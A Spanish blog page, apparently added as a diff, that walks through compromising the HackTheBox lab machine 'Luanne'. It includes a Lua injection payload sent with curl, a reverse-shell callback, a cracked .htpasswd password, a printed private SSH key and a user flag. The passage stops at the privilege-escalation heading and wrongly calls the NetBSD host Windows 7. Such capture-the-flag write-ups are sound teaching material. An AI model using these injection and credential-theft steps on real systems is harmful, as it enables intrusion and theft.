@@ -1,0 +1,784 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/piece.png">
+
+<title>Firtsmiracle Blog de Ciberseguridad</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Maquina Luanne - htb writeup | Firtsmiracle blog de Ciberseguridad</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="Maquina Luanne - htb writeup" />
+<meta name="author" content="Firtsmiracle" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="El dia de hoy vamos a resolver Luanne de hackthebox una maquina linux de dificultad facil, para poder comprometer la maquina nos aprovecharemos de una ruta expuesta con una api en JSON donde con la ayuda de burpsuite aprovecharemos el uso de parametros para causar una inyección en lua con la que ganaremos acceso a la maquina, despues aprovecharemos de un parametro de un servicio de httpd que corre en NETBSD obteniendo una clave publica con la que ganaremos acceso como un usario con mayores privilegios y finalmente en un comprimido que lograremos desencriptar obtendremos la contraseña del usuario root y habremos comprometido el sistema. Esta maquina es divertida asi que a darle!." />
+<meta property="og:description" content="El dia de hoy vamos a resolver Luanne de hackthebox una maquina linux de dificultad facil, para poder comprometer la maquina nos aprovecharemos de una ruta expuesta con una api en JSON donde con la ayuda de burpsuite aprovecharemos el uso de parametros para causar una inyección en lua con la que ganaremos acceso a la maquina, despues aprovecharemos de un parametro de un servicio de httpd que corre en NETBSD obteniendo una clave publica con la que ganaremos acceso como un usario con mayores privilegios y finalmente en un comprimido que lograremos desencriptar obtendremos la contraseña del usuario root y habremos comprometido el sistema. Esta maquina es divertida asi que a darle!." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/htb-writeup-Luanne" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/htb-writeup-Luanne" />
+<meta property="og:site_name" content="Firtsmiracle blog de Ciberseguridad" />
+<meta property="og:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Luanne/banner.jpg" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-06-29T00:00:00+00:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Luanne/banner.jpg" />
+<meta property="twitter:title" content="Maquina Luanne - htb writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Firtsmiracle"},"dateModified":"2023-06-29T00:00:00+00:00","datePublished":"2023-06-29T00:00:00+00:00","description":"El dia de hoy vamos a resolver Luanne de hackthebox una maquina linux de dificultad facil, para poder comprometer la maquina nos aprovecharemos de una ruta expuesta con una api en JSON donde con la ayuda de burpsuite aprovecharemos el uso de parametros para causar una inyección en lua con la que ganaremos acceso a la maquina, despues aprovecharemos de un parametro de un servicio de httpd que corre en NETBSD obteniendo una clave publica con la que ganaremos acceso como un usario con mayores privilegios y finalmente en un comprimido que lograremos desencriptar obtendremos la contraseña del usuario root y habremos comprometido el sistema. Esta maquina es divertida asi que a darle!.","headline":"Maquina Luanne - htb writeup","image":"http://localhost:4000/assets/images/HTB/htb-writeup-Luanne/banner.jpg","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/htb-writeup-Luanne"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/piece.png"},"name":"Firtsmiracle"},"url":"http://localhost:4000/hackthebox/htb-writeup-Luanne"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<!-- CSS -->
+<link href="/assets/css/prism.css" rel="stylesheet">
+<!-- SCSS can't be processed by browser, so we use .CSS to fix it -->
+<link href="/assets/css/theme.css" rel="stylesheet">
+<link href="/assets/css/modal.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h2>BLog de Ciberseguridad</h2><br><br>
+        <li><a href="/" id="menu-home">Inicio</a></li>
+        <li><a href="/categories#articulos">Artículos</a></li>
+        <li><a href="/categories#hackthebox" id="menu-hackthebox">HackTheBox</a></li>
+        <li><a href="/categories#novedades" id="menu-tryhackme">Novedades</a></li>
+        <li><a href="/tags">Tags</a></li>
+        <li><a href="/about" id="menu-aboutme">Información</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Buscar..."/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/piece.png" alt="Firtsmiracle blog de Ciberseguridad">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <script defer src="/assets/js/lightbox.js"></script>
+
+<div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">Maquina Luanne - htb writeup</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/?s=250&d=mm&r=x" alt="">
+            
+        </div>            
+        <div>
+        Firtmiracle <a targ="_blank" class="text-info"></a> el 
+        <span class="post-date"><time class="post-date" datetime="2023-06-29">29 Jun 2023</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="/assets/images/HTB/htb-writeup-Luanne/banner.jpg" alt="Maquina Luanne - htb writeup">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>El dia de hoy vamos a resolver <code>Luanne</code> de <code>hackthebox</code> una maquina <code>linux</code> de dificultad facil, para poder comprometer la maquina nos aprovecharemos de una ruta expuesta con una api en <code>JSON</code> donde con la ayuda de <code>burpsuite</code> aprovecharemos el uso de parametros para causar una inyección en <code>lua</code> con la que ganaremos acceso a la maquina, despues aprovecharemos de un parametro de un servicio de <code>httpd</code> que corre en <code>NETBSD</code> obteniendo una clave publica con la que ganaremos acceso como un usario con mayores privilegios y finalmente en un comprimido que lograremos desencriptar obtendremos la contraseña del usuario <code>root</code> y habremos comprometido el sistema.</p>
+
+<p>Esta maquina es divertida asi que a darle!.</p>
+
+<p>Vamos a comenzar como de costumbre creando un directorio con el nombre de la maquina:</p>
+
+<pre><code class="language-bash">❯ mkdir Luanne
+❯ ls
+ Luanne
+</code></pre>
+<p>Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:</p>
+
+<pre><code class="language-bash">❯ which mkt
+mkt () {
+	mkdir {nmap,content,exploits,scripts}
+}
+❯ mkt
+❯ ls
+ content   exploits   nmap   scripts
+</code></pre>
+
+<h2 id="enumeracion">ENUMERACION <a href="#enumeracion">#</a></h2>
+
+<p>Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando <code>ping</code>:</p>
+
+<pre><code class="language-bash">❯ ping -c 1 10.10.10.218
+PING 10.10.10.218 (10.10.10.218) 56(84) bytes of data.
+64 bytes from 10.10.10.218: icmp_seq=1 ttl=254 time=123 ms
+
+--- 10.10.10.218 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 122.913/122.913/122.913/0.000 ms
+</code></pre>
+<p>Vemos que la maquina nos responde, con un ttl de <code>254</code> y contando el salto al ser <code>255</code>, podemos usar siguiente pagina para saber a que posiblemente nos estamos enfrentando, que en este caso podria corresponder a un <code>NetBSD</code>. Mas adelante cuando comprometamos la maquina validaremos si es correcto.</p>
+
+<ul>
+  <li><a href="https://subinsb.com/default-device-ttl-values/">https://subinsb.com/default-device-ttl-values/</a></li>
+</ul>
+
+<p><img src="/assets/images/HTB/htb-writeup-Luanne/lua1.PNG" alt="" /></p>
+
+<h3 id="escaneo-de-puertos">ESCANEO DE PUERTOS</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="#enumeracion">-p-</a></td>
+      <td style="text-align: left">Escaneamos todos los 65535 puertos.</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">–open</a></td>
+      <td style="text-align: left">Solo los puertos que estén abiertos.</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">-v</a></td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando (verbose).</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">-oG</a></td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para que mediante una funcion de <a href="https://s4vitar.github.io/">S4vitar</a> nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre <code>openPorts</code>:</p>
+
+<pre><code class="language-java">❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.218 -oG openPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-29 16:31 GMT
+Initiating SYN Stealth Scan at 16:31
+Scanning 10.10.10.218 [65535 ports]
+Discovered open port 80/tcp on 10.10.10.218
+Discovered open port 22/tcp on 10.10.10.218
+Discovered open port 9001/tcp on 10.10.10.218
+Completed SYN Stealth Scan at 16:32, 26.67s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.218
+Host is up, received user-set (0.28s latency).
+Scanned at 2023-06-29 16:31:40 GMT for 27s
+Not shown: 62926 filtered tcp ports (no-response), 2606 closed tcp ports (reset)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT     STATE SERVICE    REASON
+22/tcp   open  ssh        syn-ack ttl 63
+80/tcp   open  http       syn-ack ttl 63
+9001/tcp open  tor-orport syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 26.83 seconds
+           Raw packets sent: 129915 (5.716MB) | Rcvd: 2611 (104.460KB)
+</code></pre>
+
+<h3 id="escaneo-de-version-y-servicios">ESCANEO DE VERSION Y SERVICIOS</h3>
+
+<pre><code class="language-java">❯ nmap -sCV -p22,80,9001 10.10.10.218 -oN targeted
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-29 16:33 GMT
+Nmap scan report for 10.10.10.218
+Host is up (0.27s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)
+| ssh-hostkey: 
+|   3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db (RSA)
+|   521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 (ECDSA)
+|_  256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 (ED25519)
+80/tcp   open  http    nginx 1.19.0
+| http-robots.txt: 1 disallowed entry 
+|_/weather
+|_http-server-header: nginx/1.19.0
+|_http-title: 401 Unauthorized
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=.
+9001/tcp open  http    Medusa httpd 1.12 (Supervisor process manager)
+|_http-title: Error response
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=default
+|_http-server-header: Medusa/1.12
+Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 190.40 seconds
+</code></pre>
+<p>Podemos ver que nmap nos reporta dos rutas validas <code>robots</code> y <code>weather</code>.</p>
+
+<p>Visulizamos información interesante de los puertos escaneados y que el equipo corresponde a una maquina <code>Windows 7</code>:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th>Servicio</th>
+      <th>Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>22</td>
+      <td>SSH</td>
+      <td>OpenSSH 8.0</td>
+    </tr>
+    <tr>
+      <td>80</td>
+      <td>HTTP</td>
+      <td>nginx 1.19.0</td>
+    </tr>
+    <tr>
+      <td>9001</td>
+      <td>TOR-ORPORT</td>
+      <td>Medusa httpd 1.12</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="explotación">EXPLOTACION <a href="#explotación">#</a></h2>
+
+<p>Comenzamos usando <code>whatweb</code>, para determinar las tecnologias que esta usando el servicio web.</p>
+
+<pre><code class="language-bash">❯ whatweb http://10.10.10.218
+http://10.10.10.218 [401 Unauthorized] Country[RESERVED][ZZ], HTTPServer[nginx/1.19.0], IP[10.10.10.218], Title[401 Unauthorized], WWW-Authenticate[.][Basic], nginx[1.19.0]
+</code></pre>
+
+<p>La herramienta nos reporta <code>unathorized</code>, en otras palabras nos solicita credenciales.</p>
+
+<pre><code class="language-bash">❯ whatweb http://10.10.10.218:9001
+http://10.10.10.218:9001 [401 Unauthorized] Country[RESERVED][ZZ], HTTPServer[Medusa/1.12], IP[10.10.10.218], Title[Error response], WWW-Authenticate[default][Basic]
+</code></pre>
+
+<p>Vamos a proceder Abrimos el servicio con el navegador y vemos que efectivamente nos solicita credenciales para ingresar y si intentamos usar credenciales por defecto no conseguimos ingresar.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Luanne/lua2.PNG" alt="" /></p>
+
+<p>Lo siguiente que haremos sera dirigirnos a la ruta que nmap nos reporto <code>robots.txt</code> y podemos ver que dentro la ruta <code>weather</code> esta desabilitada.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Luanne/lua3.PNG" alt="" /></p>
+
+<p>Ya que la ruta se reporta como desabilitada, vamos a suponer que existe y con <code>wfuzz</code> vamos a tratar de fuzear por archivos dentro de esa ruta.</p>
+
+<pre><code class="language-bash">❯ wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.218/weather/FUZZ
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.218/weather/FUZZ
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                               
+=====================================================================
+
+000007114:   200        1 L      12 W       90 Ch       "forecast"                                                                                                            
+000015529:   404        7 L      11 W       153 Ch      "hitb"
+</code></pre>
+
+<p>Despues de aplicar fuzzing, vemos que existe una ruta <code>forecast</code> que si la visualizamos tenemos acceso a una api <code>json</code>.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Luanne/lua4.PNG" alt="" /></p>
+
+<p>En el mensaje vemos que nos pide usar un paramatro, para poder listar las ciudades.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Luanne/lua5.PNG" alt="" /></p>
+
+<p>Como vemos que se estan usando parametros, vamos a pasar la petición por <code>burpsuite</code> para tratar de realizar inyecciones en la petición que nos permitan aprovecharnos de esta, asi que mandamos la petición con ayuda de <code>foxyproxy</code>.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Luanne/lua6.PNG" alt="" /></p>
+
+<p>Recibimos la petición en <code>burpsuite</code> y la mandamos al repeater.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Luanne/lua7.PNG" alt="" /></p>
+
+<p>Ahora trataremos de realizar una inyección en la petición incorporando una <code>'</code>.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Luanne/lua8.PNG" alt="" /></p>
+
+<p>Ocasionamos un<code>luaerror</code>, asi que podemos tratar de ejecutar un comando con <code>lua</code>, usando <code>os.execute()</code>. y comentando la query.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Luanne/lua9.PNG" alt="" /></p>
+
+<p>En principio, la inyección parece fallar, pero vamos a volver a enviarlo esta vez haciendo <code>urlencode</code> y esta vez si vemos la ejecución correctamente.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Luanne/lua10.PNG" alt="" /></p>
+
+<p>Lo siguiente que haremos sera entablarnos una <code>revershell</code> a nuestra maquina usando <code>mkfifo</code> para que si tenemos una versión distinta de <code>ncat</code> evitar inconenientes, para ello podemos usar la pagina web de confianza de <code>pentestmonkey</code>.</p>
+
+<ul>
+  <li><a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></li>
+</ul>
+
+<p>Enviamos la petición, modificando nuestra ip, puerto en escucha y sin olvidar urlencodear la petición.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Luanne/lua11.PNG" alt="" /></p>
+
+<p>Y recibimos la conexión en nuestra maquina como el usuario <code>httpd</code>.</p>
+
+<pre><code class="language-bash">❯ ncat -nlvp 443
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.218.
+Ncat: Connection from 10.10.10.218:65479.
+sh: can't access tty; job control turned off
+$ whoami
+_httpd
+$ hostname
+luanne.htb
+$ uname -a  
+NetBSD luanne.htb 9.0 NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020  mkrepro@mkrepro.NetBSD.org:/usr/src/sys/arch/amd64/compile/GENERIC amd64
+</code></pre>
+
+<p>Y vemos que si se corresponde a un <code>NetBSD</code>.</p>
+
+<p>Ahora vamos a lista los procesos que se estan ejecutando en la maquina y obervamos una correspondiente al demonio de <code>httpd</code>, por el puerto <code>3001</code> que apunta a la ruta <code>weather</code>similar a la que usamos para ganar acceso al sistema.</p>
+
+<pre><code class="language-bash">curl -u -X -s -i "http://127.0.0.1:3000/weather/forecast?city=list'"
+Enter host password for user '-X':
+
+HTTP/1.1 500 Error
+Content-Type: application/json
+
+&lt;br&gt;Lua error: /usr/local/webapi/weather.lua:49: attempt to call a nil value
+
+curl -u -X -s -i "http://127.0.0.1:3000/weather/forecast?city=list'%29%3B+os.execute%28%22id%22%29--%2B-"
+Enter host password for user '-X':
+
+HTTP/1.1 500 Error
+Content-Type: application/json
+
+{"code": 500,"error": "unknown city: listuid=24(_httpd) gid=24(_httpd) groups=24(_httpd)
+curl -u -X -s -i "http://127.0.0.1:3000/weather/forecast?city=list'%29%3B+os.execute%28%22whoami%22%29--%2B-"
+Enter host password for user '-X':
+
+HTTP/1.1 500 Error
+Content-Type: application/json
+
+{"code": 500,"error": "unknown city: list_httpd
+</code></pre>
+
+<p>Observamos que tambien podemos ejecutar comandos, pero como el mismo usuario, asi que no nos serviria hacerlo. Pero vemos que en la ejecución del comando incorpora distintos parametros y podemos ver a que corresponde en <code>NETBSD</code>.</p>
+
+<p>Encontramos un articulo que nos explica a detalle el funcionamiento de los parametros.</p>
+
+<ul>
+  <li><a href="https://man.netbsd.org/NetBSD-9.3/i386/httpd.8">https://man.netbsd.org/NetBSD-9.3/i386/httpd.8</a></li>
+</ul>
+
+<p>Entre los parametros que se utiliza en la petición, podemos ver que <code>-u</code>, permite la transformación de localizadores uniformes de recursos de la forma <code>/~user/</code> en el directorio <code>~user/public_html</code>.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Luanne/lua12.PNG" alt="" /></p>
+
+<p>Ahora podemos aprovecharnos de esto, para lista los recursos del directorio <code>r.michaels</code>, pero como realiza una autenticación, necesitamos credenciales y si listamos los archivos ocultos de nuestro directorio actual, podemos ver un archivo de nombre <code>.htpasswd</code> que al leerlo se nos reporta un usuario con una contraeña hasheada que podemos intentar crackerla con <code>john</code>.</p>
+
+<pre><code class="language-bash">ls -la
+total 20
+drwxr-xr-x   2 root  wheel  512 Nov 25  2020 .
+drwxr-xr-x  24 root  wheel  512 Nov 24  2020 ..
+-rw-r--r--   1 root  wheel   47 Sep 16  2020 .htpasswd
+-rw-r--r--   1 root  wheel  386 Sep 17  2020 index.html
+-rw-r--r--   1 root  wheel   78 Nov 25  2020 robots.txt
+cat .htpasswd
+webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
+</code></pre>
+
+<p>Despues de realizar el crackeo <code>john</code>, nos reporta la contraseña en texto claro, asi que ahora que contamos con credenciales validar <code>webapi_user:iamthebest</code>, podemos usarlas en la petición.</p>
+
+<pre><code class="language-bash">curl -s -X GET "http://127.0.0.1:3001/~r.michaels/" -u 'webapi_user:iamthebest'
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"/&gt;
+&lt;style type="text/css"&gt;
+table {
+	border-top: 1px solid black;
+	border-bottom: 1px solid black;
+}
+th { background: aquamarine; }
+tr:nth-child(even) { background: lavender; }
+&lt;/style&gt;
+&lt;title&gt;Index of ~r.michaels/&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;&lt;h1&gt;Index of ~r.michaels/&lt;/h1&gt;
+&lt;table cols=3&gt;
+&lt;thead&gt;
+&lt;tr&gt;&lt;th&gt;Name&lt;th&gt;Last modified&lt;th align=right&gt;Size
+&lt;tbody&gt;
+&lt;tr&gt;&lt;td&gt;&lt;a href="../"&gt;Parent Directory&lt;/a&gt;&lt;td&gt;16-Sep-2020 18:20&lt;td align=right&gt;1kB
+&lt;tr&gt;&lt;td&gt;&lt;a href="id_rsa"&gt;id_rsa&lt;/a&gt;&lt;td&gt;16-Sep-2020 16:52&lt;td align=right&gt;3kB
+&lt;/table&gt;
+&lt;/body&gt;&lt;/html&gt;
+</code></pre>
+
+<p>Esta vez podemos listar el contenido del usuario <code>r.michaels</code> y dentro vemos su <code>id_rsa</code>.</p>
+
+<p>Ahora tal y como nos dice el articulo de <code>NETBSD</code>, podemos hacer uso del paramtro <code>-G</code> para ver el output.</p>
+
+<pre><code class="language-bash">curl -s -X GET "http://127.0.0.1:3001/~r.michaels/id_rsa" -u 'webapi_user:iamthebest' -G id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAvXxJBbm4VKcT2HABKV2Kzh9GcatzEJRyvv4AAalt349ncfDkMfFB
+Icxo9PpLUYzecwdU3LqJlzjFga3kG7VdSEWm+C1fiI4LRwv/iRKyPPvFGTVWvxDXFTKWXh
+0DpaB9XVjggYHMr0dbYcSF2V5GMfIyxHQ8vGAE+QeW9I0Z2nl54ar/I/j7c87SY59uRnHQ
+kzRXevtPSUXxytfuHYr1Ie1YpGpdKqYrYjevaQR5CAFdXPobMSxpNxFnPyyTFhAbzQuchD
+ryXEuMkQOxsqeavnzonomJSuJMIh4ym7NkfQ3eKaPdwbwpiLMZoNReUkBqvsvSBpANVuyK
+BNUj4JWjBpo85lrGqB+NG2MuySTtfS8lXwDvNtk/DB3ZSg5OFoL0LKZeCeaE6vXQR5h9t8
+3CEdSO8yVrcYMPlzVRBcHp00DdLk4cCtqj+diZmR8MrXokSR8y5XqD3/IdH5+zj1BTHZXE
+pXXqVFFB7Jae+LtuZ3XTESrVnpvBY48YRkQXAmMVAAAFkBjYH6gY2B+oAAAAB3NzaC1yc2
+EAAAGBAL18SQW5uFSnE9hwASldis4fRnGrcxCUcr7+AAGpbd+PZ3Hw5DHxQSHMaPT6S1GM
+3nMHVNy6iZc4xYGt5Bu1XUhFpvgtX4iOC0cL/4kSsjz7xRk1Vr8Q1xUyll4dA6WgfV1Y4I
+GBzK9HW2HEhdleRjHyMsR0PLxgBPkHlvSNGdp5eeGq/yP4+3PO0mOfbkZx0JM0V3r7T0lF
+8crX7h2K9SHtWKRqXSqmK2I3r2kEeQgBXVz6GzEsaTcRZz8skxYQG80LnIQ68lxLjJEDsb
+Knmr586J6JiUriTCIeMpuzZH0N3imj3cG8KYizGaDUXlJAar7L0gaQDVbsigTVI+CVowaa
+POZaxqgfjRtjLskk7X0vJV8A7zbZPwwd2UoOThaC9CymXgnmhOr10EeYfbfNwhHUjvMla3
+GDD5c1UQXB6dNA3S5OHArao/nYmZkfDK16JEkfMuV6g9/yHR+fs49QUx2VxKV16lRRQeyW
+nvi7bmd10xEq1Z6bwWOPGEZEFwJjFQAAAAMBAAEAAAGAStrodgySV07RtjU5IEBF73vHdm
+xGvowGcJEjK4TlVOXv9cE2RMyL8HAyHmUqkALYdhS1X6WJaWYSEFLDxHZ3bW+msHAsR2Pl
+7KE+x8XNB+5mRLkflcdvUH51jKRlpm6qV9AekMrYM347CXp7bg2iKWUGzTkmLTy5ei+XYP
+DE/9vxXEcTGADqRSu1TYnUJJwdy6lnzbut7MJm7L004hLdGBQNapZiS9DtXpWlBBWyQolX
+er2LNHfY8No9MWXIjXS6+MATUH27TttEgQY3LVztY0TRXeHgmC1fdt0yhW2eV/Wx+oVG6n
+NdBeFEuz/BBQkgVE7Fk9gYKGj+woMKzO+L8eDll0QFi+GNtugXN4FiduwI1w1DPp+W6+su
+o624DqUT47mcbxulMkA+XCXMOIEFvdfUfmkCs/ej64m7OsRaIs8Xzv2mb3ER2ZBDXe19i8
+Pm/+ofP8HaHlCnc9jEDfzDN83HX9CjZFYQ4n1KwOrvZbPM1+Y5No3yKq+tKdzUsiwZAAAA
+wFXoX8cQH66j83Tup9oYNSzXw7Ft8TgxKtKk76lAYcbITP/wQhjnZcfUXn0WDQKCbVnOp6
+LmyabN2lPPD3zRtRj5O/sLee68xZHr09I/Uiwj+mvBHzVe3bvLL0zMLBxCKd0J++i3FwOv
++ztOM/3WmmlsERG2GOcFPxz0L2uVFve8PtNpJvy3MxaYl/zwZKkvIXtqu+WXXpFxXOP9qc
+f2jJom8mmRLvGFOe0akCBV2NCGq/nJ4bn0B9vuexwEpxax4QAAAMEA44eCmj/6raALAYcO
+D1UZwPTuJHZ/89jaET6At6biCmfaBqYuhbvDYUa9C3LfWsq+07/S7khHSPXoJD0DjXAIZk
+N+59o58CG82wvGl2RnwIpIOIFPoQyim/T0q0FN6CIFe6csJg8RDdvq2NaD6k6vKSk6rRgo
+IH3BXK8fc7hLQw58o5kwdFakClbs/q9+Uc7lnDBmo33ytQ9pqNVuu6nxZqI2lG88QvWjPg
+nUtRpvXwMi0/QMLzzoC6TJwzAn39GXAAAAwQDVMhwBL97HThxI60inI1SrowaSpMLMbWqq
+189zIG0dHfVDVQBCXd2Rng15eN5WnsW2LL8iHL25T5K2yi+hsZHU6jJ0CNuB1X6ITuHhQg
+QLAuGW2EaxejWHYC5gTh7jwK6wOwQArJhU48h6DFl+5PUO8KQCDBC9WaGm3EVXbPwXlzp9
+9OGmTT9AggBQJhLiXlkoSMReS36EYkxEncYdWM7zmC2kkxPTSVWz94I87YvApj0vepuB7b
+45bBkP5xOhrjMAAAAVci5taWNoYWVsc0BsdWFubmUuaHRiAQIDBAUG
+-----END OPENSSH PRIVATE KEY-----
+</code></pre>
+
+<p>Ya con la <code>id_rsa</code> al estar abierto el puerto <code>22</code>, podemos conectarnos como <code>r.michaels</code>, sin proporcionar contraseña.</p>
+
+<pre><code class="language-bash">❯ nvim id_rsa
+❯ chmod 600 id_rsa
+❯ ssh -i id_rsa r.michaels@10.10.10.218
+The authenticity of host '10.10.10.218 (10.10.10.218)' can't be established.
+ECDSA key fingerprint is SHA256:KB1gw0t+80YeM3PEDp7AjlTqJUN+gdyWKXoCrXn7AZo.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.218' (ECDSA) to the list of known hosts.
+Last login: Fri Sep 18 07:06:51 2020
+NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020
+
+Welcome to NetBSD!
+
+luanne$ whoami
+r.michaels
+</code></pre>
+
+<p>Visualizamos los archivos, del directorio y podemos leer la primera flag <code>user.txt</code>.</p>
+
+<pre><code class="language-bash">backups     devel       public_html user.txt
+luanne$ cat user.txt                                                                                                                                                                  
+ea5f0ce6a917b0be1eabc7f9218febc0
+</code></pre>
+
+<h2 id="escalada-de-privilegios">ELEVACION DE PRIVILEGIOS <a href="#escalada-de-privilegios">#</a></h2>
+
